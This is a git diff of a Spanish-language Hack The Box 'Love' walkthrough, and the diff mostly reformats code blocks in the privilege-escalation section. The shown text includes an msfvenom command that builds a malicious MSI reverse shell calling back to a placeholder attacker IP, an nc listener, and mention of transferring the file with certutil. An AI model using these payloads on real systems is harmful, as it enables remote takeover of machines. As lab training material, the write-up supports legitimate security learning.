@@ -29,18 +29,24 @@ el regultado de ambos query debe devolver el valor 1, es decir (value is 0x1), d
  
  Podemos generar un archivo malicoiso .msi con msfvenom.
  
- ```msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+ ```
+ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+ 
  ```
  
- ![Love HTB Escalando Privilegio ](/assets/images/love-2.png)
+ 
+![Love HTB Escalando Privilegio ](/assets/images/love-2.png)
 
 Podemos ponernos en escucha por el puerto especificado en el payload, o hacer uso del exploit/multi/handler.
 
-```rlwrap nc -nlvp 443
- ```
+```
+rlwrap nc -nlvp 443
+ 
+```
+
 Transferimos el archivo setup.msi a la máquina víctima, en esta ocasión haciendo uso de certutil.exe, como podemos ver a continuación. 
 
- ![Love HTB Escalando Privilegio ](/assets/images/love-3.png)
+![Love HTB Escalando Privilegio ](/assets/images/love-3.png)
  
 En nuestro caso lo depositamos en la siguiente ruta.
 {% highlight bash %}
